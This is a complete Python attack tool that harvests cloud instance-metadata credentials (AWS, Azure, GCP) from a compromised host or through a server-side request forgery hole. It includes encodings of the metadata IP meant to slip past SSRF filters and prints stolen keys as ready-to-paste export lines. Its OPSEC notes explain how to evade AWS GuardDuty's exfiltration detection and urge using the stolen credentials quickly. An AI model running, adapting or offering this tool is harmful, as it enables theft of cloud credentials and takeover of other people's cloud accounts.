#!/usr/bin/env python3
"""
imds_harvester.py - Harvest cloud instance-metadata credentials from AWS, Azure, or GCP,
either by running on the instance (--local) or through an SSRF prefix (--ssrf URL).

USAGE
  # On a compromised host / pod:
  python3 imds_harvester.py --local --provider aws
  python3 imds_harvester.py --local --provider gcp
  python3 imds_harvester.py --local --provider azure --resource https://vault.azure.net/

  # Through an SSRF (the tool appends the metadata URL to your prefix, URL-encoding it):
  python3 imds_harvester.py --ssrf "https://app/proxy?url=" --provider aws
  python3 imds_harvester.py --ssrf "https://app/proxy?url=" --provider azure \
        --resource https://management.azure.com/

  # Try IPv4-encoding bypasses if a filter blocks the literal metadata IP:
  python3 imds_harvester.py --ssrf "https://app/proxy?url=" --provider aws --bypass

OUTPUT
  Prints credentials and, for AWS, ready-to-paste `export AWS_*` lines.

DEPENDENCIES
  pip install requests   (only requests; no cloud SDKs needed)

OPSEC
  AWS GuardDuty flags instance-role creds used off-instance (InstanceCredentialExfiltration).
  Stolen creds are short-lived; harvest and use quickly, ideally from the instance's egress IP.
"""
import argparse
import json
import sys
import urllib.parse

try:
    import requests
except ImportError:
    sys.exit("[!] pip install requests")

AWS_IP = "169.254.169.254"
GCP_HOST = "metadata.google.internal"

# Alternative encodings of 169.254.169.254 to defeat naive SSRF filters
AWS_IP_BYPASS = [
    "169.254.169.254",
    "0xa9.0xfe.0xa9.0xfe",      # hex octets
    "0251.0376.0251.0376",      # octal octets
    "2852039166",               # dword decimal
    "[::ffff:169.254.169.254]",  # IPv4-mapped IPv6
    "169.254.169.254.nip.io",   # wildcard DNS to the literal IP
]


def fetch(url, headers=None, method="GET", ssrf_prefix=None, timeout=8):
    """GET a URL directly, or via an SSRF prefix (URL-encoding the target)."""
    if ssrf_prefix:
        # Most SSRF sinks only do GET and cannot set headers, so SSRF mode is GET-only.
        target = ssrf_prefix + urllib.parse.quote(url, safe="")
        r = requests.get(target, timeout=timeout)
        return r.status_code, r.text
    r = requests.request(method, url, headers=headers or {}, timeout=timeout)
    return r.status_code, r.text


def harvest_aws(args):
    base_ips = AWS_IP_BYPASS if args.bypass else [AWS_IP]
    for ip in base_ips:
        root = f"http://{ip}/latest"
        token = None
        # IMDSv2: PUT for a token (works in --local; SSRF usually cannot PUT + set headers)
        if args.local:
            try:
                tk = requests.put(
                    f"{root}/api/token",
                    headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
                    timeout=6,
                )
                if tk.ok:
                    token = tk.text.strip()
                    print(f"[*] IMDSv2 token acquired via {ip}")
            except requests.RequestException:
                pass
        hdr = {"X-aws-ec2-metadata-token": token} if token else None
        list_url = f"{root}/meta-data/iam/security-credentials/"
        try:
            sc, body = fetch(list_url, headers=hdr, ssrf_prefix=args.ssrf)
        except requests.RequestException as e:
            print(f"[-] {ip}: {e}")
            continue
        if sc != 200 or not body.strip():
            print(f"[-] {ip}: no role list (status {sc})")
            continue
        role = body.strip().splitlines()[0]
        sc, cred = fetch(list_url + role, headers=hdr, ssrf_prefix=args.ssrf)
        if sc != 200:
            print(f"[-] {ip}: role {role} returned {sc}")
            continue
        data = json.loads(cred)
        print(f"\n[+] AWS role: {role}  (via {ip})")
        print(f"export AWS_ACCESS_KEY_ID={data['AccessKeyId']}")
        print(f"export AWS_SECRET_ACCESS_KEY={data['SecretAccessKey']}")
        print(f"export AWS_SESSION_TOKEN={data['Token']}")
        print(f"# expires: {data.get('Expiration')}")
        return data
    print("[-] AWS metadata unreachable with the methods tried.")
    return None


def harvest_azure(args):
    resource = args.resource or "https://management.azure.com/"
    url = (f"http://{AWS_IP}/metadata/identity/oauth2/token"
           f"?api-version=2018-02-01&resource={urllib.parse.quote(resource, safe='')}")
    # Azure requires the 'Metadata: true' header. SSRF that cannot set headers will fail here;
    # try anyway (some gateways forward it) and report.
    hdr = {"Metadata": "true"}
    try:
        sc, body = fetch(url, headers=hdr, ssrf_prefix=args.ssrf)
    except requests.RequestException as e:
        print(f"[-] Azure IMDS error: {e}")
        return None
    if sc != 200:
        print(f"[-] Azure IMDS status {sc}: {body[:200]}")
        if args.ssrf:
            print("    (Azure needs the 'Metadata: true' header — header-less SSRF will not work.)")
        return None
    data = json.loads(body)
    tok = data.get("access_token", "")
    print(f"\n[+] Azure MI token for resource {resource}")
    print(f"export AZURE_ACCESS_TOKEN={tok}")
    print(f"# expires_on: {data.get('expires_on')}  client_id: {data.get('client_id')}")
    return data


def harvest_gcp(args):
    base = f"http://{GCP_HOST}/computeMetadata/v1/instance/service-accounts/default"
    hdr = {"Metadata-Flavor": "Google"}
    try:
        sc, tok = fetch(f"{base}/token", headers=hdr, ssrf_prefix=args.ssrf)
        _, email = fetch(f"{base}/email", headers=hdr, ssrf_prefix=args.ssrf)
        _, scopes = fetch(f"{base}/scopes", headers=hdr, ssrf_prefix=args.ssrf)
    except requests.RequestException as e:
        print(f"[-] GCP metadata error: {e}")
        return None
    if sc != 200:
        print(f"[-] GCP metadata status {sc}: {tok[:200]}")
        if args.ssrf:
            print("    (GCP needs the 'Metadata-Flavor: Google' header — header-less SSRF will not work.)")
        return None
    data = json.loads(tok)
    print(f"\n[+] GCP SA: {email.strip()}")
    print(f"export GCP_ACCESS_TOKEN={data.get('access_token')}")
    print(f"# expires_in: {data.get('expires_in')}s  scopes: {scopes.strip()}")
    return data


def main():
    p = argparse.ArgumentParser(description="Cloud IMDS / metadata credential harvester")
    p.add_argument("--provider", required=True, choices=["aws", "azure", "gcp"])
    mode = p.add_mutually_exclusive_group(required=True)
    mode.add_argument("--local", action="store_true", help="run on the instance/pod")
    mode.add_argument("--ssrf", help="SSRF prefix; metadata URL is appended (URL-encoded)")
    p.add_argument("--resource", help="Azure: token audience/resource")
    p.add_argument("--bypass", action="store_true", help="AWS: try IP-encoding bypasses")
    a = p.parse_args()

    if a.provider == "aws":
        harvest_aws(a)
    elif a.provider == "azure":
        harvest_azure(a)
    else:
        harvest_gcp(a)


if __name__ == "__main__":
    main()
